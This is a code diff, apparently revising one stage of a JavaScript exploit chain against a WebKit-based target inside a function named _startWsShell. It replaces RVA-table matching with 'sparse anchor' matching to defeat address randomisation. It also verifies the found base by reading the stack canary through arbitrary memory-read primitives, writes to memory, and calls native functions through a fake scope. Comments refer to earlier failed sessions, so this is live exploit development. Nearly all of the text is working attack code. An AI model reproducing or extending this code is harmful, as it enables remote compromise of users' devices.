@@ -5142,44 +5142,42 @@ function _startWsShell(){
           if(vals.length>=256)break;
         }
         EL('harvest n='+vals.length);
-        /* ---- stage 2: match against the RVA table ---- */
+        /* ---- stage 2 (v6): SPARSE-ANCHOR MATCHING ONLY ----
+         * The wrapper RVAs are RETIRED: the wrapper region spans 10+ 16KB
+         * pages so its low-14 residues blanket the value space - four dead
+         * sessions proved wrapper matches are noise. The EIGHT sparse
+         * anchors have ~0.05% random-match rates each; the WK module
+         * imports several of these functions directly from the target.
+         * Two anchors agreeing on one base = confirmation-grade. The
+         * stack-guard anchor verifies WITHOUT CALLING: its pointer targets
+         * the canary - a random-looking 64-bit value there confirms all. */
         var skip={};
         if(msg.skip){String(msg.skip).split(',').forEach(function(t){var tt=t.trim();if(tt){try{skip[BigInt(tt)]=1;}catch(e){}}});}
         var cand={};
         for(var vi=0;vi<vals.length;vi++){
           var P=vals[vi];
           var pl=Number(P&0x3fffn);
-          for(var ri=0;ri<E2_RVAS.length;ri++){
-            var R=E2_RVAS[ri];
+          for(var si=0;si<E2_SPARSE.length;si++){
+            var R=E2_SPARSE[si];
             if((R&0x3fff)===pl){
               var B=P-BigInt(R);
               if(B<0x800000000n||B>0x900000000n)continue;
               if(skip[B])continue;
-              /* cluster sanity: no harvested pointer in [B+1, B+0x1000) -
-               * the lowest text RVA of a module is >= 0x1000 (ELF header
-               * first); kills the one-page-high decoys (session 12) */
               var bad=false;
               for(var kj=0;kj<vals.length;kj++){var q=vals[kj];if(q>B&&q<B+0x1000n){bad=true;break;}}
               if(bad)continue;
               var k=B.toString(16);
-              cand[k]=cand[k]||{B:B,pairs:0,wden:0,demo:[]};
-              cand[k].pairs++;
-              if(cand[k].demo.length<6)cand[k].demo.push('P=0x'+P.toString(16)+' R=0x'+R.toString(16));
+              cand[k]=cand[k]||{B:B,anchors:0,names:[],guardPtr:null};
+              cand[k].anchors++;
+              cand[k].names.push((E2_SPARSE_NAMES[R]||('rva 0x'+R.toString(16)))+'@0x'+P.toString(16));
+              if(R===E2_LK.stackChkGuard)cand[k].guardPtr=P;
             }
           }
         }
-        /* wrapper-region density: harvested pointers in [B+0x1A000, B+0x1E000) */
         var clist=Object.keys(cand).map(function(k){return cand[k];});
-        for(var ci=0;ci<clist.length;ci++){
-          var B2=clist[ci].B;
-          for(var pj=0;pj<vals.length;pj++){
-            var d=vals[pj]-B2;
-            if(d>=0x1A000n&&d<0x1E000n)clist[ci].wden++;
-          }
-        }
-        clist.sort(function(a,b){return (b.pairs*1000+b.wden)-(a.pairs*1000+a.wden);});
-        EL('candidates n='+clist.length+(clist.length?' top=0x'+clist[0].B.toString(16)+' pairs='+clist[0].pairs+' wden='+clist[0].wden:''));
-        if(!clist.length){reply.log=elog;reply.err='no candidates';break;}
+        clist.sort(function(a,b){return b.anchors-a.anchors;});
+        ELs('sparse n='+clist.length+(clist.length?' top=0x'+clist[0].B.toString(16)+' a='+clist[0].anchors+' ['+clist[0].names.join(';')+']':''));
+        if(!clist.length){reply.log=elog;reply.err='no sparse candidates';break;}
         }
         /* ---- stage 3: verifier ladder ---- */
         function e2call(t){
@@ -5231,7 +5229,20 @@ function _startWsShell(){
         }
         for(var ti=0;ti<clist.length&&ti<maxC;ti++){
           var B3=clist[ti].B;
-          ELs('try 0x'+B3.toString(16)+' (pairs='+clist[ti].pairs+' wden='+clist[ti].wden+')');
+          ELs('try 0x'+B3.toString(16)+' (anchors='+clist[ti].anchors+' ['+clist[ti].names.join(';')+'])');
+          /* v6a: CANARY VERIFICATION (no call): if this candidate carries a
+           * stack-guard anchor, read the canary AT the anchor pointer - the
+           * guard is a random 64-bit value; anything small/zero/ASCII is a
+           * mismatch (skip without calling). */
+          if(clist[ti].guardPtr){
+            var can=S.absRead(clist[ti].guardPtr,8)[0];
+            ELs('canary=0x'+can.toString(16));
+            if(!(can>0x1000000n)){ELs('canary looks wrong - skip');continue;}
+            ELs('CANARY CONFIRMED - base 0x'+B3.toString(16));
+          }else if(clist[ti].anchors<2){
+            ELs('single anchor, no guard - skip');
+            continue;
+          }
           for(var zi=0;zi<4;zi++)S.absWrite(S.fakeScope+BigInt(zi*8),0n);
           e2callRaw(B3+BigInt(E2_LK.gettodWrapper));
           var tv0=S.absRead(S.fakeScope,8)[0],tv1=S.absRead(S.fakeScope+8n,8)[0];
@@ -5249,7 +5260,7 @@ function _startWsShell(){
         reply.lkbase='0x'+lkBase.toString(16);
         reply.pid=pid;
         reply.pidn=Number(pid);
-        reply.cands=clist.slice(0,8).map(function(c){return {base:'0x'+c.B.toString(16),pairs:c.pairs,wden:c.wden,demo:c.demo};});
+        reply.cands=clist.slice(0,8).map(function(c){return {base:'0x'+c.B.toString(16),anchors:c.anchors,names:c.names};});
         reply.log=elog;
         try{bs('E2SHOT-COMPLETE lk=0x'+lkBase.toString(16)+' tv='+(reply.tv||'?')+' pid='+pid+' pidraw='+(reply.pidraw||'?'));}catch(e){}
         break;
